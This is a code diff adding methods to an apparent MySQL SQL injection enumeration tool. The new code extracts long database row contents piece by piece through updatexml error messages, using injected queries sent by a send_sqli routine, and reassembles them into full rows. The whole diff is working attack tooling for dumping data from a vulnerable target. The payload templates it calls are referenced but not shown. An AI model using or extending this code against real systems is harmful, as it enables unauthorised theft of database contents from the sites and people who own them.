@@ -111,6 +111,59 @@ class MYSQLENUM():
         
         return row_len
 
+    def get_partial_row_content(self, row, table, col, pos, buff):
+        '''Retrieve partial conetents of a row based on the offest(pos) and buffer length'''
+        
+        self.construct_vuln_field(self.get_partial_row_pl.format(
+                                table_name=table,col_name=col, pos=pos, buff=buff)
+                                +self.limits.replace('~num~',row))
+        
+        enum_logger.info("Querying partial content of row no. '{}' for {}.{} [pos: {}, buff: {}]".format(
+                        row, table, col, pos, buff))
+        
+        partial = self.send_sqli()
+        
+        return partial
+
+    def generate_partial_row_content(self, row, table, col, buff, iterations):
+        '''Generator for retrieving the complete contents of a row'''
+        
+        prog_bar = trange(iterations)
+        
+        for pos in prog_bar:
+            
+            row_part = self.get_partial_row_content(row, table, col, (buff*pos)+1, buff)
+            
+            prog_bar.set_description("Retrieving partial row: {}".format(clr.red(row_part)))
+            
+            yield row_part
+        
+    def get_long_row_content(self, row, table, col):
+        '''Some row contents retrieved are longer than the maximum length of the error message displayed by updatexml part of the mysql query. This function retrieves the entire contents part by part and then returned the complete row contents after joining them'''
+        
+        complete_row = ""
+        
+        row_len = self.get_row_len(row, table, col)
+        
+        iterations = int(row_len)//self.buff
+        
+        chars_retrieved = iterations*self.buff
+        
+        residue_len = int(row_len) - chars_retrieved
+        
+        row_content_iterator = self.generate_partial_row_content(row, table, col, self.buff, iterations)
+        
+        for partial_row_content in row_content_iterator:
+            
+            complete_row = complete_row+partial_row_content
+        
+        if residue_len > 0:
+            
+            complete_row = complete_row+self.get_partial_row_content(row, table, col, chars_retrieved+1, residue_len)
+        
+        return complete_row
+
+
     def get_params(self):
         '''Construct and return a dictionary of the command line parameters provided'''
         
